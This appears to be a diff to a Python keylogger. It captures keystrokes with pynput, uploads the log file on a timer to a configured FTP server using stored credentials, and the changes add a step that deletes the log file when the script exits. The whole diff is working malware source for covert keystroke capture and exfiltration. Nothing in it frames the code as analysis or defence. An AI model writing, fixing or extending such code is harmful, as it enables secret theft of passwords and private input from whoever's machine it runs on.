@@ -2,9 +2,7 @@
 from pynput import keyboard
 from ftplib import FTP
 import threading
-import atexit
 import os
-
 
 # FTP Configurations
 ftp_server = 'server.ip'
@@ -29,7 +27,7 @@ def send_log():
     try:
         ftp = FTP(ftp_server)
         ftp.login(user=ftp_username, passwd=ftp_password)
-        with open('logs.txt', 'rb') as file:
+        with open('log.txt', 'rb') as file:
             ftp.storbinary('STOR logs.txt', file)
         ftp.quit()
         return "file uploaded"
@@ -37,16 +35,26 @@ def send_log():
         return f"Error uploading log file: {e}"
 
 
-#  Function that will first upload the log to the server
-#  then delete the log file if the script is shutdown for some reason
-
-
-
 # Main function that starts the logger
 def main():
-    listener = keyboard.Listener(on_press=keypressed)
-    listener.start()
-    threading.Timer(upload_interval, send_log).start()  # Uploads the log every hour
+    try:
+        # Start the keyboard listener
+        listener = keyboard.Listener(on_press=keypressed)
+        listener.start()
+
+        # Schedule log upload
+        threading.Timer(upload_interval, send_log).start()
+
+        # Wait for the listener to finish (should never happen)
+        listener.join()
+
+    finally:
+        # Delete the log file before exiting
+        try:
+            os.remove("log.txt")
+            print("log.txt deleted")
+        except Exception as e:
+            print(f"Error deleting log.txt file: {e}")
 
 
 if __name__ == "__main__":
